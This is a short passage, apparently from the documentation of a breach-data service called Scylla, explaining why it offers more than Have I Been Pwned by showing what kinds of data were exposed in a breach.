Why Not Have I Been Pwned (HIBP)

HIBP is a project by Troy Hunt to allow you to monitor if your email is in a breach. It is a great service and I encourage everyone to sign up for it. Scylla data, however, provides additional context by telling you *what* data was breached. This context can be critical in an organization or in your personal situational awareness. A breached password used on a single site that was changed 5 years ago is unalarming, whereas a breach report that your organization appears in a breach can be. Not knowing the information breached can be costly to an organization
